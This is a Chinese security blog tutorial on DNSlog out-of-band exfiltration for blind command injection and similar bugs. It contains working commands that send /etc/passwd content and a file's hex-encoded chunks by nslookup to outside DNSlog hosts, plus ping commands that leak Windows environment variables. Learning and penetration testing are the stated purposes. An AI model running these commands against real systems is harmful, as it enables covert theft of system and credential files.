@@ -1,0 +1,1253 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<link href="https://blog.csdn.net/qinjilll/article/details/141442703" rel="canonical"/>
+<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+<meta content="webkit" name="renderer">
+<meta content="webkit" name="force-rendering">
+<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+<meta content='{"pid": "blog", "spm":"1001.2101"}' name="report"/>
+<meta content="no-referrer" name="referrer"/>
+<meta content="no-siteapp" http-equiv="Cache-Control"><link href="#" media="handheld" rel="alternate"/>
+<meta content="5a59773ab8077d4a62bf469ab966a63b_1497598848" name="shenma-site-verification"/>
+<meta content="pc" name="applicable-device"/>
+<link href="https://g.csdnimg.cn/static/logo/favicon32.ico" rel="shortcut icon" type="image/x-icon"/>
+<title>【技巧】DNSlog外带文件-CSDN博客</title>
+
+
+<meta content="dnslog" name="keywords"/>
+<meta content='{"autorun":true,"install":true,"keyword":"dnslog"}' name="csdn-baidu-search"/>
+<meta content="文章浏览阅读3.8k次，点赞16次，收藏30次。我们都知道DNS就是将域名解析为ip，用户在浏览器上输入一个域名A.com，就要靠DNS服务器将A.com解析到它的真实ip127.0.0.1，这样就可以访问127.0.0.1服务器上的相应服务。那么DNSlog是什么。DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名等的访问信息，类似日志文件。我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功。_dnslog" name="description"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/pc/css/detail_enter-c282253ab5.min.css" rel="stylesheet" type="text/css"/>
+
+<link href="https://csdnimg.cn/release/blogv2/dist/pc/themesSkin/skin-whitemove/skin-whitemove-2af9149bdc.min.css" rel="stylesheet" type="text/css"/>
+
+
+
+<meta content='{"type":"0","fixModel":"1"}' name="toolbar"/>
+
+
+<link href="https://csdnimg.cn/public/sandalstrap/1.4/css/sandalstrap.min.css" rel="stylesheet" type="text/css"/>
+<style>.MathJax, .MathJax_Message, .MathJax_Preview {
+    display: none
+    }</style>
+
+
+
+
+
+</meta></meta></meta></head>
+<body class="nodata" style="">
+<div id="toolbarBox" style="min-height: 48px;"></div>
+
+
+
+<link href="https://csdnimg.cn/release/blogv2/dist/pc/css/blog_code-01256533b5.min.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/chart-3456820cac.css" rel="stylesheet">
+<link href="https://g.csdnimg.cn/lib/swiper/6.0.4/css/swiper.css" rel="stylesheet">
+
+
+<div class="main_father clearfix d-flex justify-content-center mainfather-concision" style="height:100%;">
+<div class="container clearfix container-concision" id="mainBox">
+
+<main>
+
+<div class="blog-content-box">
+<div class="article-header-box" id="article-header-box">
+<div class="article-header">
+<div class="article-title-box">
+<h1 class="title-article" id="articleContentId">【技巧】DNSlog外带文件</h1>
+</div>
+<div class="article-info-box">
+<div class="article-bar-top">
+<div class="bar-content active">
+<span class="article-type-text original">原创</span>
+<a class="article-vip-box" data-report-click='{"spm":"3001.10404"}' data-report-query="spm=3001.10404" data-report-view='{"spm":"3001.10404"}' href="https://mall.csdn.net/vip" target="_blank"><img alt="" class="article-vip-img-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/identityVipNew.png"/></a>
+<span class="time">已于 2024-09-09 10:05:47 修改</span>
+<span class="border-dian">·</span>
+<span class="read-count">3.8k 阅读</span>
+<div class="read-count-box is-like like-ab-new" data-type="top">
+<span class="border-dian">·</span>
+
+<img alt="" class="article-read-img article-heard-img" id="is-like-img-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Black.png" style="display:block"/>
+<span class="read-count" id="blog-digg-num" style="color:;">
+                      16
+                  </span>
+</div>
+<span class="border-dian">·</span>
+<a class="un-collection" data-report-click='{"mod":"popu_823","spm":"1001.2101.3001.4232","ab":"new"}' id="blog_detail_zk_collection">
+<img alt="" class="article-collect-img article-heard-img un-collect-status isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect2.png" style="display:inline-block"/>
+
+<span class="get-collection">
+                      30
+                  </span>
+</a>
+<span class="border-dian">·</span>
+<div class="href-article-edit-new">
+<span class="href-article-edit-click">CC 4.0 BY-SA版权</span>
+<div class="slide-content-box-new">
+                                版权声明：本文为博主原创文章，遵循<a href="http://creativecommons.org/licenses/by-sa/4.0/" rel="noopener" target="_blank"> CC 4.0 BY-SA </a>版权协议，转载请附上原文出处链接和本声明。
+                    </div>
+</div>
+</div>
+<div class="operating active">
+</div>
+</div>
+<div class="blog-tags-box">
+<div class="tags-box artic-tag-box">
+<div class="article-tag">
+<span class="label">文章标签：</span>
+<p>
+<a class="tag-link-new" data-report-click='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"安全","ab":"new","extra":"{\"searchword\":\"安全\"}"}' data-report-query="spm=1001.2101.3001.4223" data-report-view='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"安全","ab":"new","extra":"{\"searchword\":\"安全\"}"}' href="https://so.csdn.net/so/search/s.do?q=%E5%AE%89%E5%85%A8&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" rel="noopener" target="_blank">#安全</a>
+<a class="tag-link-new" data-report-click='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"自动化","ab":"new","extra":"{\"searchword\":\"自动化\"}"}' data-report-query="spm=1001.2101.3001.4223" data-report-view='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"自动化","ab":"new","extra":"{\"searchword\":\"自动化\"}"}' href="https://so.csdn.net/so/search/s.do?q=%E8%87%AA%E5%8A%A8%E5%8C%96&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" rel="noopener" target="_blank">#自动化</a>
+</p>
+</div>
+<p class="community-name" id="community-name"></p>
+</div>
+</div>
+<div class="up-time"><span>于 2024-08-23 04:49:43 首次发布</span></div>
+</div>
+</div>
+</div>
+<div class="" id="blogHuaweiyunAdvert"></div>
+<article class="baidu_pl">
+<div class="article_content clearfix" id="article_content">
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-10bf609291.css" rel="stylesheet"/>
+<div class="htmledit_views atom-one-dark" id="content_views">
+<div>
+<p style="margin-left:0;"><span style="color:rgba(0,0,0,.75);"><span style="background-color:#ffffff;"><span style="color:#4d4d4d;">❤️<span style="color:#ff0000;"><strong>博客主页</strong>：</span> <a href="https://blog.csdn.net/qinjilll?spm=1011.2421.3001.5343" title="iknow181">iknow181</a><br/> 🔥<span style="color:#ff7f00;"><strong>系列专栏</strong>：</span> <a href="https://blog.csdn.net/qinjilll/category_12762762.html" title="网络安全">网络安全</a>、 <a href="https://blog.csdn.net/qinjilll/category_12471761.html" title="Python">Python</a>、<a href="https://blog.csdn.net/qinjilll/category_12469992.html" title="JavaSE">JavaSE</a>、<a href="https://blog.csdn.net/qinjilll/category_12470000.html" title="JavaWeb">JavaWeb</a>、<a href="https://blog.csdn.net/qinjilll/category_12470008.html" title="CCNP">CCNP</a><br/> 🎉<span style="color:#cc3299;"><strong>欢迎大家点赞👍收藏⭐评论✍</strong></span></span></span></span></p>
+</div>
+<div>
+<hr/>
+</div>
+<div>
+<p style="margin-left:0;"><span style="color:rgba(0,0,0,.75);"><span style="background-color:#ffffff;"><span style="color:#4d4d4d;"><img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/blog_migrate/a170f2c5a42323a4b35f5febdeae23ff.gif#pic_center"/></span></span></span></p>
+<p style="margin-left:0;"></p>
+<h3 id="toc-2">1.什么是DNSlog</h3>
+<p id="u334a36c1">我们都知道DNS就是将域名解析为ip，用户在浏览器上输入一个域名<code>A.com</code>，就要靠DNS服务器将A.com解析到它的真实ip127.0.0.1，这样就可以访问127.0.0.1服务器上的相应服务。<br/> 那么DNSlog是什么。DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名<code>www.baidu.com</code>等的访问信息，类似日志文件。</p>
+<h3 id="P0xn9">2.为什么要用 DNSlog</h3>
+<p id="u9b6d8755">在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起 DNS 请求，这个时候就可以通过这种方式把想获得的数据外带出来。</p>
+<h3 id="toc-3">3.DNSlog回显原理</h3>
+<p id="ub8940567">前面说DNSlog就是日志，那怎么用DNSlog进行注入并回显信息呢。通俗的说就是我有个已注册的域名<code>a.com</code>，我在域名代理商那里将域名设置对应的ip 1.1.1.1 上，这样当我向dns服务器发起a.com的解析请求时，DNSlog中会记录下他给a.com解析，解析值为1.1.1.1，而我们这个解析的记录的值就是我们要利用的地方。</p>
+<p id="u97130397">看个直观一点的例子来理解：<br/> ping命令的时候会用到DNS解析所以我就用ping命令做个实验。</p>
+<p id="u1cb4bd72"></p>
+<p class="img-center"><img alt="" height="303" id="u88da1611" src="https://i-blog.csdnimg.cn/blog_migrate/eb51c16dafb32d2f53d9f617d63c547d.png" width="795"/></p>
+<p id="u1cb4bd72"><br/> DNSlog.cn中也记录了下来</p>
+<p id="uef99439b"></p>
+<p class="img-center"><img alt="" height="564" id="u39fed9b5" src="https://i-blog.csdnimg.cn/blog_migrate/7e9755343e911b1fd14a4de4e516d1cb.png" width="1200"/></p>
+<p id="uc27f0408">可以看到解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和a.com拼接起来，最后ping命令执行将XF.a.com一起发给DNS服务器请求解析域名对应的ip地址，这个过程被记录下来就是DNSlog，看到这里应该有点感觉了。原理上只要能进行DNS请求的函数都可能存在DNSlog注入。</p>
+<h3 id="HqAud">4.DNSLog 平台</h3>
+<table id="qlYLN"><tbody><tr><td> <p id="uf7466334">DNSLog Platform</p> </td><td> <p id="udae67b0f">http://www.dnslog.cn/</p> </td><td> <p id="u887113ca">互联网</p> </td><td> <p id="ub3dd7ea4">DNSLog.cn 无需注册即可使用的DNSLog平台</p> </td></tr><tr><td> <p id="uda55826e">CEYE.io</p> </td><td> <p id="ue1065219">http://ceye.io/</p> </td><td> <p id="u765a82f8">互联网</p> </td><td> <p id="ueeb3d537">CEYE.io - DNSLog 平台</p> </td></tr><tr><td> <p id="ub4599431">Interact.sh | Web Client</p> </td><td> <p id="u3c2b4279">https://app.interactsh.com/#/</p> </td><td> <p id="uc2c1f5b7">互联网</p> </td><td> <p id="u4d66cd0a">Interact.sh | Web Client</p> </td></tr><tr><td> <p id="u94f62430">eyes.sh</p> </td><td> <p id="u605a9836">http://eyes.sh/</p> </td><td> <p id="u9d2f98f2">互联网</p> </td><td> <p id="uac351f42">DNSLog/HTTPLog tool for pentesters</p> </td></tr><tr><td> <p id="ueaae8350">T00LS DNSLog</p> </td><td> <p id="u3ef76159">https://www.t00ls.com/dnslog.html</p> </td><td> <p id="ua247334d">互联网</p> </td><td> <p id="u3bb47008">T00LS DNSLog（需登录）</p> </td></tr><tr><td> <p id="u9dd9493a">DNSLog.pw</p> </td><td> <p id="u20b63b65">http://dnslog.pw/</p> </td><td> <p id="uba6da894">互联网</p> </td><td> <p id="u517686c3">dnslog.pw</p> </td></tr><tr><td> <p id="u397aba65">Dig.pm</p> </td><td> <p id="ue1a87c73">https://dig.pm/</p> </td><td> <p id="ub98c3930">互联网</p> </td><td> <p id="ua381fd0d">Dig.pm</p> </td></tr><tr><td> <p id="ud7183bcf">dnslog.ink</p> </td><td> <p id="ue5f5602f">http://dnslog.ink/</p> </td><td> <p id="ud1b5b42f">互联网</p> </td><td> <p id="u49b70222">dnslog.ink</p> </td></tr></tbody></table>
+<h3 id="xsEAp">5.DNSlog通常用在哪些地方</h3>
+<p id="uca32d0c3">大家在渗透测试的时候可能会遇到一下这些情况：</p>
+<ul><li id="ub5ac9383">挖到一个有SQL盲注的站点，可是用sqlmap跑需要频繁请求，最后导致ip被ban</li><li id="u145e3007">发现疑似命令注入的洞，但是目标站点什么也不显示，无法确认是不是有洞</li></ul>
+<p id="u763bde56">总之就是目标不让信息显示出来，如果能发送请求，那么就可以尝试咱这个办法——用DNSlog来获取回显</p>
+<p id="u6d78f8e0">（1）SQL注入中的盲注</p>
+<p id="ud98dc15f">（2）XSS盲打</p>
+<p id="u151b8c85">（3）无回显的命令执行</p>
+<p id="u9bbbdf62">（4）无回显的SSRF</p>
+<p id="u79152217">（5）无回显的XXE（Blind XXE）</p>
+<h4 id="toc-7">5.1 无回显的命令执行</h4>
+<h5 id="nkJbu">5.1.1 介绍</h5>
+<p id="u4c34761e">我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功</p>
+<h5 id="LZFjq">5.1.2 利用</h5>
+<p id="u33314c66">发现疑似命令执行的洞，但是目标站点什么也不显示，无法确认是不是有洞</p>
+<h6 id="MpkKb">5.1.2.1 Windows</h6>
+<p id="uf9f48f2b">如果是win系统，简单的<code>ping %os%.xxxx.cete.io</code>即可</p>
+<p id="u00adfb8c"></p>
+<p class="img-center"><img alt="" height="631" id="ue58bf833" src="https://i-blog.csdnimg.cn/blog_migrate/b28d5787cdb2a0055d46011f330a2360.png" width="1102"/></p>
+<p id="u832a3afe">DNSlog这边得到了os的信息，那么就说明这里存在命令注入</p>
+<p id="u8ab0557f">下面是windows的常用变量：</p>
+<pre class="new-version set-code-height prettyprint set-code-show" id="HiPeS"><code>//变量                     类型       描述
+//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
+//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
+//%CD%                     本地       返回当前目录字符串。
+//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
+//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
+//%COMPUTERNAME%           系统       返回计算机的名称。
+//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
+//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
+//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
+//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
+//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
+//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
+//%PATH%                   系统       指定可执行文件的搜索路径。
+//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
+//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
+//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
+//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
+//%PROCESSOR_REVISION%     系统       返回处理器的版本号。
+//%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
+//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
+//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
+//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
+//%TEMP%和%TMP%            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
+//%TIME%                   系统       返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。
+//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
+//%USERNAME%               本地       返回当前登录的用户的名称。
+//%USERPROFILE%            本地       返回当前用户的配置文件的位置。
+//%WINDIR%                 系统       返回操作系统目录的位置。</code></pre>
+<h6 id="S9TV9">5.1.2.2 Linux</h6>
+<p id="u3563110e">如果目标系统是linux的话，则可用shell语言</p>
+<p class="img-center"><img alt="" height="179" id="ud662a66d" src="https://i-blog.csdnimg.cn/blog_migrate/7712dd2bd60a345bf06acd0c5fa7ce7a.png" width="713"/></p>
+<p id="u3d57ef54"></p>
+<p class="img-center"><img alt="" height="400" id="u22ec8687" src="https://i-blog.csdnimg.cn/blog_migrate/92510d6f75ed0199cd83db3a55ce3197.png" width="1016"/></p>
+<h6 id="s0k0b">5.1.2.3 如何将一个文件的内容外带出来</h6>
+<p id="u9c5e236b">可以通过 <code>nslookup</code> 命令将 <code>/etc/passwd</code> 文件中的部分内容通过 DNS 查询外带到一个外部域名上。这种方法是通过 DNS 查询来传输数据，非常适用于隐蔽的数据外带。</p>
+<p id="u94b15e59"><strong>解析命令</strong></p>
+<pre class="new-version set-code-height prettyprint set-code-show" id="bbSJv"><code>nslookup $(cat /etc/passwd | base64 | head -c 63).g23a5v.dnslog.cn</code></pre>
+<p id="u0bf015b7"><strong>命令组成部分：</strong></p>
+<ol><li id="uca1fd253"><code><strong>cat /etc/passwd</strong></code>：</li></ol>
+<ul><li>
+<ul><li id="uaf7b567b">读取 <code>/etc/passwd</code> 文件的内容。这个文件包含系统中所有用户的信息。</li></ul></li></ul>
+<ol><li id="u5e28e6fc"><code><strong>base64</strong></code>：</li></ol>
+<ul><li>
+<ul><li id="uda0ee302">将文件内容编码为 Base64。这是因为 DNS 查询的主机名通常只能包含字母、数字、连字符等字符，Base64 编码可以确保数据在这些限制内。</li></ul></li></ul>
+<ol><li id="u0814d548"><code><strong>head -c 63</strong></code>：</li></ol>
+<ul><li>
+<ul><li id="ud2d3f62e">截取 Base64 编码后的前 63 个字符。因为 DNS 查询的子域名长度有限，通常为 63 字符以内。</li></ul></li></ul>
+<ol><li id="u6dcd2b79"><code><strong>nslookup ... .</strong>g23a5v.dnslog.cn</code>：</li></ol>
+<ul><li>
+<ul><li id="u8abbf78b">使用 <code>nslookup</code> 发送一个 DNS 查询请求，将数据附加在子域名上。这个请求会被发送到 <code>oast.fun</code> 域名的 DNS 服务器，通常该域名由攻击者控制，可以记录这些请求。</li></ul></li></ul>
+<p id="uc940a824"></p>
+<p id="u22ce005a"><strong>过程</strong></p>
+<p id="u6ec6ae2d">要将 <code>/etc/passwd</code> 文件的全部内容通过 DNS 查询逐步外带出去，可以分批次发送这些数据。这通常是通过分块读取文件内容，然后使用多个 <code>nslookup</code> 命令来完成。</p>
+<p id="u9533d7e4"><strong>分块读取并发送数据</strong></p>
+<p id="u06cd3247">可以使用 <code>tail</code> 和 <code>head</code> 命令来读取并发送所有的字符。下面是一个例子：</p>
+<h5 id="eaa46aaf">1. <strong>发送第1块（前63个字符）</strong>:</h5>
+<pre class="new-version set-code-height prettyprint set-code-show" id="tVQJL"><code>nslookup $(cat /etc/passwd | base64 | head -c 63).g23a5v.dnslog.cn</code></pre>
+<p id="u9df27cdd"></p>
+<p class="img-center"><img alt="" height="243" id="uf7c44d90" src="https://i-blog.csdnimg.cn/blog_migrate/ca207cba607ae15df6a1bbdea57ce511.png" width="1128"/></p>
+<p id="u99400058"></p>
+<p class="img-center"><img alt="" height="573" id="u0961e877" src="https://i-blog.csdnimg.cn/blog_migrate/ddc7e93db8b45c5d9b8add635c765d65.png" width="990"/></p>
+<p id="u6b2c7862"></p>
+<p class="img-center"><img alt="" height="454" id="ufe0f1880" src="https://i-blog.csdnimg.cn/blog_migrate/d7c5c465ec8188b63cdf791f2a7162ae.png" width="916"/></p>
+<h5 id="bdaad16d">2. <strong>发送第2块（64-126个字符）</strong>:</h5>
+<pre class="new-version set-code-height prettyprint set-code-show" id="yvqUE"><code>nslookup $(cat /etc/passwd | base64 | tail -c +64 | head -c 63).g23a5v.dnslog.cn</code></pre>
+<h5 id="8cf2eb89">3. <strong>发送第3块（127-189个字符）</strong>:</h5>
+<pre class="new-version set-code-height prettyprint set-code-show" id="aWEGd"><code>nslookup $(cat /etc/passwd | base64 | tail -c +127 | head -c 63).g23a5v.dnslog.cn</code></pre>
+<p id="u95c43494"><strong>解释命令</strong></p>
+<ul><li id="u8ddf30c9"><code><strong>tail -c +64</strong></code>：从第64个字符开始读取。</li><li id="u4c458a75"><code><strong>head -c 63</strong></code>：截取接下来的63个字符。</li></ul>
+<p id="uf82437a6">通过逐步增加 <code>tail -c +N</code> 中的 <code>N</code> 值，你可以依次读取并发送文件的后续块内容。</p>
+<p id="ua80890dd"></p>
+<p id="u27c6f410"><strong>自动化整个过程</strong></p>
+<p id="u5c5db067">为了自动化整个过程，可以使用循环将文件内容分批次发送出去：</p>
+<p id="ucc496f32">这里的 DNSlog 平台最好使用可以查看历史记录的，因为如果文件内容大多话，数据会很多，我用的http://eyes.sh/，可以随机登录，挺方便的。</p>
+<p id="ub166cce7">这里就不用/etc/passwd 演示了，自己创建了一个文件，假设为重要文件，将它外带出来</p>
+<p id="ue04ca4d8"></p>
+<p class="img-center"><img alt="" height="223" id="ue81803f2" src="https://i-blog.csdnimg.cn/blog_migrate/76b7fd8293bbdee5251f16fc5fa94be5.png" width="292"/></p>
+<p id="u69dd1ef7">这里使用了 hex 编码，因为 base64 后有大写字母，而 dnslog 外带出去是会全变成小写，造成失真。</p>
+<pre class="new-version set-code-height prettyprint set-code-show" id="xpxj7"><code>od -An -tx1 /root/test.txt | tr -d ' \n' | fold -w 63 | while read -r chunk; do
+  nslookup "$chunk.prindqd5.eyes.sh"
+done</code></pre>
+<p id="u51b7bc45"></p>
+<p class="img-center"><img alt="" height="487" id="u648e6d83" src="https://i-blog.csdnimg.cn/blog_migrate/1da446805952d70a30810fd985bc05e6.png" width="1121"/></p>
+<p id="ucd1537b1"></p>
+<p class="img-center"><img alt="" height="594" id="u1c847ba0" src="https://i-blog.csdnimg.cn/blog_migrate/7dc3bfa08940b6304dfbd833c36f5e42.png" width="1200"/></p>
+<p id="uec65bffd">拼接 然后 hex 解码，</p>
+<p id="u86eabe9b"></p>
+<p class="img-center"><img alt="" height="642" id="u837f7a2d" src="https://i-blog.csdnimg.cn/blog_migrate/f82b5997982ea3ba65fef95f0e59b71d.png" width="1200"/></p>
+<h4 id="1bbbb204">注意事项</h4>
+<ul><li id="ue105a8ab"><strong>带宽限制</strong>：DNS请求长度有限，分块时每块最多63个字符。</li><li id="uf4a938d9"><strong>请求数量</strong>：如果文件较大，需要发送大量请求。</li></ul>
+</div>
+<div>
+<p style="margin-left:0;"><span style="color:rgba(0,0,0,.75);"><span style="background-color:#ffffff;"><span style="color:#4d4d4d;"><img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/blog_migrate/44696b9fc71021ca6d125801eee82179.gif#pic_center"/></span></span></span></p>
+</div>
+<div>
+<div></div>
+</div>
+</div>
+</div>
+</article>
+
+</div>
+
+<div class="more-toolbox-new more-toolbar" id="toolBarBox">
+<div class="left-toolbox">
+<div class="toolbox-left">
+<div class="profile-box">
+<a class="profile-href" href="https://blog.csdn.net/qinjilll" target="_blank"><img class="profile-img" src="https://profile-avatar.csdnimg.cn/1712346f49574d77a62dc1dab4af793b_qinjilll.jpg!1"/>
+<span class="profile-name">
+                  iknow181
+                </span>
+</a>
+</div>
+<div class="profile-attend">
+<a class="tool-attend tool-bt-button tool-bt-attend" data-report-view='{"mod":"1592215036_002","spm":"1001.2101.3001.4232","extend1":"关注"}' href="javascript:;">关注</a>
+
+</div>
+</div>
+<div class="toolbox-middle">
+<ul class="toolbox-list">
+<li class="tool-item tool-item-size tool-active is-like" data-type="bottom" id="is-like">
+<a class="tool-item-href">
+
+
+<img alt="" class="isdefault" id="is-like-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/like.png" style="display:block"/>
+<span class="count" id="spanCount">
+                    16
+                </span>
+</a>
+<div class="tool-hover-tip"><span class="text space">点赞</span></div>
+</li>
+<li class="tool-item tool-item-size tool-active is-unlike" id="is-unlike">
+<a class="tool-item-href">
+
+<img alt="" class="isdefault" id="is-unlike-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/unlike.png" style="margin-right:0px;display:block"/>
+<span class="count" id="unlikeCount"></span>
+</a>
+<div class="tool-hover-tip"><span class="text space">踩</span></div>
+</li>
+<li class="tool-item tool-item-size tool-active is-collection">
+<a class="tool-item-href" data-report-click='{"mod":"popu_824","spm":"1001.2101.3001.4130","ab":"new"}' href="javascript:;">
+
+<img alt="" class="isdefault" id="is-collection-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/collect.png" style="display:block"/>
+
+<span class="count get-collection" data-num="30" id="get-collection">
+                    30
+                </span>
+</a>
+<div class="tool-hover-tip collect">
+<div class="collect-operate-box">
+<span class="collect-text" id="is-collection">
+                    收藏
+                  </span>
+</div>
+</div>
+<div class="tool-active-list">
+<div class="text">
+                  觉得还不错?
+                  <span class="collect-text" id="tool-active-list-collection">
+                    一键收藏
+                  </span>
+<img alt="" id="tool-active-list-close" src="https://csdnimg.cn/release/blogv2/dist/pc/img/collectionCloseWhite.png"/>
+</div>
+</div>
+</li>
+<li class="tool-item tool-item-size tool-active tool-item-comment">
+<div class="guide-rr-first">
+<img alt="" src="https://csdnimg.cn/release/blogv2/dist/pc/img/guideRedReward01.png"/>
+<button class="btn-guide-known">知道了</button>
+</div>
+<a class="tool-item-href go-side-comment" data-report-click='{"spm":"1001.2101.3001.7009"}'>
+<img alt="" class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/comment.png"/>
+<span class="count">
+                      0
+                </span>
+</a>
+<div class="tool-hover-tip"><span class="text space">评论</span></div>
+</li>
+<li class="tool-item tool-item-size tool-active tool-QRcode" data-type="article" id="tool-share">
+<a class="tool-item-href" data-report-view='{"spm":"3001.4129","extra":{"type":"blogdetail"}}' href="javascript:;">
+<img alt="" class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/share.png"/>
+<span class="count">分享</span>
+</a>
+<div class="QRcode active" id="tool-QRcode">
+<div class="share-bg-box">
+<div class="share-content">
+<a class="btn-share" data-type="link" id="copyPosterUrl">复制链接</a>
+</div>
+<div class="share-content">
+<a class="btn-share" data-type="qq">分享到 QQ</a>
+</div>
+<div class="share-content">
+<a class="btn-share" data-type="weibo">分享到新浪微博</a>
+</div>
+<div class="share-code">
+<div class="share-code-box" id="shareCode"></div>
+<div class="share-code-text">
+<img alt="" src="https://csdnimg.cn/release/blogv2/dist/pc/img/share/icon-wechat.png"/>扫一扫
+                    </div>
+</div>
+</div>
+</div>
+</li>
+<li class="tool-item tool-item-size tool-active tool-item-reward">
+<a class="tool-item-href" data-report-click='{"mod":"popu_830","spm":"1001.2101.3001.4237","dest":"","ab":"new"}' href="javascript:;">
+<img alt="打赏" class="isdefault reward-bt" id="rewardBtNew" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/reward.png"/>
+<span class="count">打赏</span>
+</a>
+<div class="tool-hover-tip"><span class="text space">打赏</span></div>
+</li>
+<li class="tool-item tool-item-size tool-active is-more" id="is-more">
+<a class="tool-item-href">
+<img alt="" class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/more.png" style="margin-right:0px;display:block"/>
+<span class="count"></span>
+</a>
+<div class="more-opt-box">
+<div class="mini-box">
+<a class="tool-item-href" data-report-click='{"spm":"3001.4237","extra":"{\"type\":\"hide\"}"}' id="rewardBtNewHide">
+<img alt="打赏" class="isdefault reward-bt" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/reward.png"/>
+<span class="count">打赏</span>
+</a>
+<a class="tool-item-href" id="toolReportBtnHide">
+<img alt="" class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/report.png"/>
+<span class="count">举报</span>
+</a>
+</div>
+<div class="normal-box">
+<a class="tool-item-href" id="toolReportBtnHideNormal">
+<img alt="" class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/report.png"/>
+<span class="count">举报</span>
+</a>
+</div>
+</div>
+</li>
+</ul>
+</div>
+<div class="toolbox-right">
+<div class="tool-directory">
+<a class="bt-columnlist-show" data-description="记录自己网络安全学习的一些经验和手法" data-free="true" data-hotrank="0" data-id="12762762" data-img="https://i-blog.csdnimg.cn/direct/cac5d7312d634000865f53b39e81ec19.png?x-oss-process=image/resize,m_fixed,h_224,w_224" data-join="false" data-oldprice="0" data-people="2" data-price="0" data-report-click='{"spm":"1001.2101.3001.6334","extend1":"专栏目录"}' data-report-view='{"spm":"1001.2101.3001.6334","extend1":"专栏目录"}' data-status="true" data-studysubscribe="false" data-studyvip="true" data-subscribe="false" data-sum="23" data-title="网络安全" data-url="https://blog.csdn.net/qinjilll/category_12762762.html">专栏目录</a>
+</div>
+</div>
+</div>
+</div>
+
+
+
+<a id="commentBox" name="commentBox"></a>
+
+<div class="first-recommend-box recommend-box recommend-highlight-default">
